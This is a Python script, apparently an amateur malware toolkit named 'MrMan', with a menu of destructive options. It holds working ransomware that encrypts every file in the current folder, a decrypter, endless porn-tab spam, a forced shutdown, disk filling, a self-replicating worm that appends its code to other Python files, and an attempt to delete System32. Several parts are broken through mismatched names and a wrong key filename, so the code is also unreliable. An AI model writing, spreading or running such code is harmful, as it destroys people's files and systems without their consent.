#Imports
import random
import webbrowser
import time
import os
from cryptography.fernet import Fernet 


#Title Screen and loading
print("|~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~##~~~~~~~|\n"
"|~~~~~~~~###~~~###~~~~~####~~~~####~~####~~~~~~#####~~~~~~~###~~~~~##~~~~~~~~|\n"
"|~~~~~~~##~~###~~##~~~##~~~~~~##~~####~~##~~~~##~~~##~~~~~##~##~~~##~~~~~~~~~|\n"
"|~~~~~##~~~~~#~~~~##~~##~~~~~##~~~~##~~~~##~~~#######~~~~##~~~##~##~~~~~~~~~~|\n"
"|~~~~##~~~~~~~~~~~~##~##~~~~##~~~~~~~~~~~~##~~##~~~##~~~##~~~~~###~~~~~~~~~~~|\n"
"|~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~##~~~~~~~~~~~~~~~~~~~~~|")
time.sleep(2)
print("-!!Make sure this file is runing in this machines hard drive or SSD else you might damage your usb or extenal device!!-")
time.sleep(1)
print("Loading...")
time.sleep(4)
print("Ready!")
time.sleep(1)

#Choosing a Option
while True:
	print("Choose a option. Or type h or help")
	choice = input("1.Ransom this machine\n 2.MrMan Ransomeware Decrypter\n  3.Naughty Window Spam 18+\n"    
	"    4.Shutdown\n   5.Fill up Drive\n  6.Inject Worm\n 7.Goodbye System32\n:")

#Ransomeware
	if choice == "1":
		import os

		files = []
		for file in os.listdir():
			if file == "MrMan.py" or file == "the key.key" or file == "Decrypt.py":
				continue
			if os.path.isfile(file):
				files.append(file)
		print(files)

		key = Fernet.generate_key()

		with open("thekey.key","wb") as thekey:
			thekey.write(key)
		
		for file in files:
			with open(file,"rb") as thefile:
				contents = thefile.read()
			contents_encrypted = Fernet(key).encrypt(contents)
			with open(file,"wb") as thefile:
				thefile.write(contents_encrypted)
#Ransomeware Decrypter
	if choice == "2":
		import os

		files = []
		for file in os.listdir():
			if file == "MrMan.py" or file == "the key.key" or file == "Decrypt.py":
				continue
			if os.path.isfile(file):
				files.append(file)
		print(files)

		with open("thekey.key","rb") as key:
			secretkey = key.read()
		
		for file in files:
			with open(file,"rb") as thefile:
				contents = thefile.read()
			contents_decrypted = Fernet(secretkey).decrypt(contents)
			with open(file,"wb") as thefile:
				thefile.write(contents_decrypted)


#Naughty Spam 18+
	if choice =="3":
		import webbrowser
		while True:
			time.sleep(1.5)
			webbrowser.open_new_tab("www.pornhub.com")

#Shutdown
	if choice == "4":
		import os

		shutdown = input("Do you wish to shutdown this machine ? (yes / no): ")

		if shutdown == 'no':
			pass
		else:
			os.system("shutdown /s /t 1")

#Fill Up Drive
	if choice == "5":
		import os 
		print("-!The more files you inject the longer it will take but more space will be taken!-\n -MrMan")
		hmf = int(input("How many files do you want to inject: "))

		for i in range(0,hmf):
			filename = "MrMan_" +str(i) + "_.txt"
			command = " " + filename
			os.system(command)
			command = "echo MrMan was here >" + filename
			os.system(command)

#Worm
	if choice == "6":
		import os 
		import random

		File = open(__file__,'r')
		Data = File.read()
		File.close()
	#Copys this script to a folder
		def Random():
			name = ''
			letters = '1234567890qwertyuiopasdfghjklzxcvbnm'
			lenght = random.randint(1, 11)
			for i in range(lenght):
				name += random.choice(letters)
			return name

		def Remake(File_Name,Fold):
			try:
				os.mkdir(Folder)
				os.chdir(Folder)
				File = open(File_Name + '.py','w')
				File.write(Data)
				File.close()
				os.chdir("..")
			
			except Exception as Error:
				Fold = Fold + "0"
				Remake(File_Name,Fold)
		for i in range(5):
			Name = Random()
			remake(Name,"clone")

		files = list()
		for file in os.listdir():
			if file.endswith(".py"):
				Files.append(file)
		files.remove(__file__)
	#Injects This Script into other python scripts in the same folder
		for File in Files:
			object = open(File,'a')
			object.write(Data)
			object.close()

	if choice == "7":	
		file_path = 'C:\Windows\System32'
		os.remove(file_path)

	if choice == "8":
		pass

	if choice =="help" or choice == "h":
		print("===---Help---===\n1.Ransom this machine - Encypts the whole machine\n2.MrMan Ransomeware Decrypter - Decypts Ransomeware inflicted by MrMan\n"
		" 3.Naughty Window Spam 18+ - Spams multiple tabs of Po*nhub\n"    
		"4.Shutdown - Shuts down the machine\n5.Fill up Drive - makes a the number of txt files you set\n"
		"6.Inject Worm - Injects a worm into a machine\n7.Goodbye System32 - Deletes system32\n")